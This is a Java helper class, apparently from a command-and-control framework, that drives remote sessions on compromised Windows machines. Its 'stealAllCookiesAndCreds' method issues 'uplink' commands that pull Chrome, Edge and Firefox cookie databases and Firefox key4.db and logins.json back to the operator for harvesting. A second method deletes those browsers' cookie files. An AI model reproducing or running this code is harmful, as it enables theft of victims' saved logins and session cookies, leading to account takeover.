package c2.win;

import static org.junit.jupiter.api.Assertions.assertEquals;

import java.io.File;
import java.util.Base64;

import c2.Constants;
import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.session.Session;
import c2.session.macro.MacroOutcome;
import util.Time;

public class CookiesCommandHelper {

	public static final String CHROME_COOKIES_FILENAME = "\"%APPDATA%\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\"";
	
	public static final String EDGE_CHROMIUM_FILENAME = "\"%APPDATA%\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies\""; 
	
	public static final String FIREFOX_COOKIES_ROOT = "%APPDATA%\\Mozilla\\Firefox\\Profiles";
	public static final String FIREFOX_COOKIES_FILENAME = "cookies.sqlite";
	
	private static String getFirefoxCookieFilenameWithAppdata() {
		String firefoxProfileRoot = stripQuotesAndReplaceAppdata(CookiesCommandHelper.FIREFOX_COOKIES_ROOT);
		File[] directories = new File(firefoxProfileRoot).listFiles(File::isDirectory);
		assertEquals(directories.length, 1);
		return CookiesCommandHelper.FIREFOX_COOKIES_ROOT + "\\" + directories[0].getName() + "\\" + CookiesCommandHelper.FIREFOX_COOKIES_FILENAME;
	}
	
	private static String stripQuotesAndReplaceAppdata(String target) {
		String targetFilename = target.replaceAll("\"", "");
		String appData = System.getenv().get("APPDATA");
		targetFilename = targetFilename.replace("%APPDATA%", appData);
		return targetFilename;
	}
	
	public static String getChromeCookiesFilename() {
		return stripQuotesAndReplaceAppdata(CookiesCommandHelper.CHROME_COOKIES_FILENAME);
	}
	
	public static String getFirefoxCookiesFilename() {
		return stripQuotesAndReplaceAppdata(getFirefoxCookieFilenameWithAppdata());
	}
	
	public static String getEdgeCookiesFilename() {
		return stripQuotesAndReplaceAppdata(CookiesCommandHelper.EDGE_CHROMIUM_FILENAME);
	}
	
	public static MacroOutcome clearAllCookies(IOManager io, int sessionId) {
		MacroOutcome outcome = new MacroOutcome();
		//Chrome
		String deleteCmd = "del " + CHROME_COOKIES_FILENAME;
		outcome.addSentCommand(deleteCmd);
		io.sendCommand(sessionId, deleteCmd);
		
		String response = io.readAllMultilineCommands(sessionId);
		if(!response.equals("")) {
			outcome.addResponseIo(response);
		}
		//Firefox
		try {
			String firefoxProfileName = getFirefoxProfileName(io, sessionId, outcome).dirName;
			//System.out.println(firefoxProfileName);
			deleteCmd = "del " + FIREFOX_COOKIES_ROOT + "\\" + firefoxProfileName + "\\" + FIREFOX_COOKIES_FILENAME;
			//System.out.println(deleteCmd);
			outcome.addSentCommand(deleteCmd);
			io.sendCommand(sessionId, deleteCmd);
			response = io.readAllMultilineCommands(sessionId);
			if(!response.equals("")) {
				outcome.addResponseIo(response);
			}
		}catch(Exception ex) {
			//io.sendIO(sessionId, "Unable to delete Firefox cookies");
			outcome.addError("Unable to delete Firefox cookies");
			ex.printStackTrace();
		}
		
		//Edge (Chromium version)
		deleteCmd = "del " + EDGE_CHROMIUM_FILENAME;
		outcome.addSentCommand(deleteCmd);
		io.sendCommand(sessionId, deleteCmd);
		response = io.readAllMultilineCommands(sessionId);
		if(!response.equals("")) {
			outcome.addResponseIo(response);
		}
		return outcome;
	}
	
	//Why are there no waits in this method between transmission of the command to uplink and the read?
	//Good question! The read function will block for a configurable interval to try and 
	//pull data, and will only crap out after the interval has passed
	public static MacroOutcome stealAllCookiesAndCreds(IOManager io, int sessionId, HarvestProcessor harvestProcessor) {
		MacroOutcome outcome = new MacroOutcome();
		String hostname = null;
		String username = null;
		for(Session session : io.getSessions()) {
			if(session.id == sessionId) {
				String elements[] = session.uid.split(":");
				hostname = elements[0];
				username = elements[1];
			}
		}
		
		String appdataDir = null;
		try {
			//TODO link to outcome
			appdataDir = WindowsCmdLineHelper.resolveAppData(io, sessionId);
		}catch(Exception ex) {
			outcome.addError("Unable to trace APPDATA, cannot liberate cookies");
			return outcome;
		}
		
		//TODO: Log the full b64 returned cookie file?
		//Chrome
		String uplinkChrome = "uplink " + CHROME_COOKIES_FILENAME.replace("%APPDATA%", appdataDir).replaceAll("\"", "");
		outcome.addSentCommand(uplinkChrome);
		io.sendCommand(sessionId, uplinkChrome);
		byte[] chromeCookies = getUplinkedFileFromIO(io, sessionId);
		if(chromeCookies != null) {
			harvestProcessor.receiveChromeCookies(hostname, username, chromeCookies);
			outcome.addMacroMessage("Captured Chrome Cookies");
		}
		
		
		//Firefox
		try {
			FolderInfo fInfo = getFirefoxProfileName(io, sessionId, outcome);
			String uplinkFirefox = "uplink " + fInfo.fullFolder + "\\cookies.sqlite";
			outcome.addSentCommand(uplinkFirefox);
			io.sendCommand(sessionId, uplinkFirefox);
			byte[] firefoxCookies = getUplinkedFileFromIO(io, sessionId);
			//System.out.println("Firefox: " + firefoxCookies.length);
			if(firefoxCookies != null) {
				harvestProcessor.receiveFirefoxCookies(hostname, username, firefoxCookies);
				outcome.addMacroMessage("Captured Firefox Cookies");
			}
			
			uplinkFirefox = "uplink " + fInfo.fullFolder + "\\key4.db";
			outcome.addSentCommand(uplinkFirefox);
			io.sendCommand(sessionId, uplinkFirefox);
			byte[] firefoxKeysdb = getUplinkedFileFromIO(io, sessionId);
			//System.out.println("Firefox: " + firefoxKeysdb.length);
			uplinkFirefox = "uplink " + fInfo.fullFolder + "\\logins.json";
			io.sendCommand(sessionId, uplinkFirefox);
			byte[] firefoxLoginJson = getUplinkedFileFromIO(io, sessionId);
			//System.out.println("Firefox: " + firefoxLoginJson.length);
			if(firefoxKeysdb != null && firefoxLoginJson != null) {
				harvestProcessor.receiveFirefoxLogins(hostname, username, firefoxKeysdb, firefoxLoginJson);
				outcome.addMacroMessage("Captured Firefox creds");
			}
			
		}catch(Exception ex) {
			ex.printStackTrace();
		}
		
		//Edge
		String uplinkEdge = "uplink " + EDGE_CHROMIUM_FILENAME.replace("%APPDATA%", appdataDir).replaceAll("\"", "");
		outcome.addSentCommand(uplinkEdge);
		io.sendCommand(sessionId, uplinkEdge);
		byte[] edgeCookies = getUplinkedFileFromIO(io, sessionId);
		if(edgeCookies != null) {
			harvestProcessor.receiveEdgeCookies(hostname, username, edgeCookies);
			outcome.addMacroMessage("Captured Edge Cookies");
		}
		
		return outcome;
	}
	
	private static byte[] getUplinkedFileFromIO(IOManager io, int sessionId) {
		//Reference uplink syntax:
		//<control> uplinked test_uplink VGhpcyBpcyBhIHRlc3QgZmlsZSB0byB1cGxpbmsgb24gTGludXguIEl0IGhhcyBubyBwb2ludC4K
		
		String dirResponse = io.readAllMultilineCommands(sessionId);
		int counter = 0;
		//System.out.println("Response: " + dirResponse.length());
		while(dirResponse.length() == 0 && counter < Constants.getConstants().getMaxResponseWait()) {
			Time.sleepWrapped(Constants.getConstants().getRepollForResponseInterval());
			dirResponse = io.readAllMultilineCommands(sessionId);
			//System.out.println("Repoll Response: " + dirResponse.length());
			counter += Constants.getConstants().getRepollForResponseInterval();
		}
		dirResponse = dirResponse.replaceAll("\n", "").replaceAll("\r", "");
		String elements[] = dirResponse.split(" ");
		if(elements.length >= 4 &&
				elements[0].equals("<control>") &&
				elements[1].equals("uplinked")) {
			String scrubbedB64 = dirResponse.substring(dirResponse.lastIndexOf(" ") + 1);
					//elements[3].replaceAll("\n", "").replaceAll("\r", "");
			return Base64.getDecoder().decode(scrubbedB64);
		}
		return null;
	}
	
	public static FolderInfo getFirefoxProfileName(IOManager io, int sessionId, MacroOutcome outcome) throws Exception {
		String queryDirCmd = "dir " + FIREFOX_COOKIES_ROOT;
		String responseBufferFlush = io.readAllMultilineCommands(sessionId);
		if(!responseBufferFlush.equals("")) {
			outcome.addResponseIo(responseBufferFlush);
		}
		io.sendCommand(sessionId, queryDirCmd);
		outcome.addSentCommand(queryDirCmd);
		String lines[] = null;
		String dirResponse = null;
		for(int idx = 0; idx < 3; idx++) {
			dirResponse = io.awaitMultilineCommands(sessionId);
			outcome.addResponseIo(dirResponse);
			lines = dirResponse.split("\n");
			if(lines.length >= 8) {
				break;
			}
		}
		if(lines.length < 8) {
			throw new Exception("Cannot get Firefox directory from this response: " + dirResponse);
		}
		String directory = null;
		for(int idx = 1; idx < lines.length; idx++) {
			if(lines[idx].startsWith(" Directory of ")) {
				directory = lines[idx].substring(" Directory of ".length()).replace("\r", "").replace("\n", "");
			}
		}
		if(directory == null) {
			throw new Exception("Cannot get Firefox directory");
		}
		for(int idx = 7; idx < lines.length; idx++) {
			String lineWithName = lines[idx];
			if(lineWithName.contains(".default")) {
				return new FolderInfo(directory, lineWithName.split("\\s+")[4].replace("\r", "").replace("\n", ""));
			}
		}

		throw new Exception("Cannot get Firefox directory");
	}
	
	static class FolderInfo{
		public final String fullFolder;
		public final String dirName;
		
		public FolderInfo(String parentFolder, String dirName) {
			this.fullFolder = parentFolder + "\\" + dirName;
			this.dirName = dirName;
		}
	}
}
